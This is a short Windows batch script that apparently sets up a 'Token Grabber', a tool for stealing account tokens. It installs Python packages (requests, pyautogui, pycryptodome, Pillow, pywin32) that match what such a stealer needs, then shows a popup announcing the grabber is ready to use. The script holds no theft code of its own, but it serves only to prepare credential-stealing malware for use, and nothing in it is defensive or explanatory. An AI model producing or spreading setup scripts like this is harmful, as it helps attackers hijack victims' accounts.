@echo off
pip install requests pyautogui pycryptodome Pillow pywin32
echo x = msgbox("Token Grabber",5+5,"The Token Grabber is done, you can use it now !") > main.vbs
start main.vbs
del main.vbs
